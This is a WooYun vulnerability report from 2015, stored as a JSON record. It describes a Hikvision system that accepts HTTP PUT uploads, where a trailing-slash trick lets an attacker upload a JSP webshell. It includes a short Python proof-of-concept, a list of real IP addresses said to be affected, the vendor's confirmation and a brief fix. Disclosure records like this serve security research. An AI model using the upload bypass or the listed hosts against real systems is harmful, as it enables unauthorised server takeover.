{"id": 43306, "wybug_id": "wooyun-2015-0102308", "wybug_title": "海康威视某通用系统配置不当可上传getshell", "wybug_corp": "海康威视", "wybug_author": "boooooom", "wybug_date": "2015-03-19 13:01", "wybug_open_date": "2015-05-07 22:38", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["默认配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-07：\t细节向公众公开  简要描述： RT 详细说明：   WooYun: 海康威视某通用系统配置不当可PUT文件 参考这个漏洞，发现不仅可以上传，而且可以绕过上传可执行文件jsp，导致getshell，给出一部分受影响的\nhttp://220.248.86.58/http://58.210.217.89/http://221.224.5.109/http://60.191.71.242/http://218.65.37.207/http://121.41.114.207/http://124.160.225.221/http://112.91.82.203:888\n   漏洞证明：  1.如何上传一个可执行文件，如jsp比如：http://112.91.82.203:888poc如下：\ndef ces(ip):        url = 'http://' + ip + '/modules/sys/license_upload.jsp/'        try:                r = requests.put(url,data=open(\"cmd.jsp\", \"rb\").read(),timeout=1)                print url + str(r)        except:                print url\n2.为什么要去PUT '/modules/sys/license_upload.jsp/' 这个地址呢，因为如果你随意传一个jsp;webserver做了一些配置，直接会跳转到首页，不解析；但是这个地址/modules/sys/license_upload.jsp是允许的3.为什么要在地址后面加个/ ;这样你就可以绕过不能上传jsp的限制，又能保证jsp文件的正常上传。ps：有些情况url应该为licenseUpload.jsp；比如这个http://60.191.71.242/licenseUpload.jsp\n\n   修复方案：  严格配置。最好不要PUT了。   版权声明：转载请注明来源 boooooom@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-23 22:37 厂商回复： 感谢您对海康威视的关注！经排查部分旧项目运行版本存在该问题，目前公司产品线经测试不存在此问题。相关客户已通过公司技术支持进行加固配置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-19 13:56 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  沙发    \n     2015-03-19 14:51 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  boooooom收徒弟吗    \n     2015-08-07 12:50 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这什么原理……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}